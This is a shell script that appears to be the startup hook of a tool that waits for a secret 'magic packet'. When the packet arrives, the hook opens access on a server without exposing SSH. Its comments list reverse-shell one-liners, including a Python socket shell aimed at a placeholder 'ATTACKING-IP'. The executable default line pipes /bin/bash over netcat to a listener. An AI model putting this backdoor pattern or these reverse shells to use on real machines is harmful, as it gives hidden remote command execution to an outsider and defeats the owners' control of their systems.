#!/bin/sh

# This is your startup script, called by "server.sh" after a successful magic packet was received.
# This script runs when the server.sh recieves a secret pakcet from the client.
#
# Reverse Shells:
#   We may want to open an interatcive shell to enable remote code execution, without exposing SSH on any port.
#   nc / netcat / ncat / socat:
#       nc -e /bin/sh 0.0.0.0 80
#
#   Python:
#       python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#
#   More can be found online, depending on the target OS and distribution of the server.
#
# Servers:
#   HTTP:
#       If the server is an HTTP server, we want to start the HTTP server in this file.
#           service nginx start
#           service apache2 start
#           cd / && python -m http.server -b 0.0.0.0 80
#   SSH:
#       If the server is an SSH server (sshd/sftpd/ssh tunnels)
#           service sshd start
#
# Firewalls:
#   You may also want to extract the ip of the client and modify your firewall tables.
#      ufw allow ...
#      iptables -A ...
#      nftables ...
#
# Scripts:
#   Anything that's not implimented yet. Feel free to contribute!
#

# The ip of a new connected client, after secert "handshake", received as an argument from server.sh
CLIENT_IP=$1

# The port that the client should be redirected to, if iptables (or supported alternative) is installed on the server.
# If iptables isn't installed.
REAL_SERVICE_PORT=$2

# Default example: starting a reverse shell on localhost
REVERSE_SHELL_HOST='127.0.0.1'
REVERSE_SHELL_PORT=$REAL_SERVICE_PORT
echo "Connecting to reverse shell listener on $REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT"
nc -n -vvv $REVERSE_SHELL_HOST $REVERSE_SHELL_PORT -e /bin/bash

echo "Done, Exiting."
exit 0
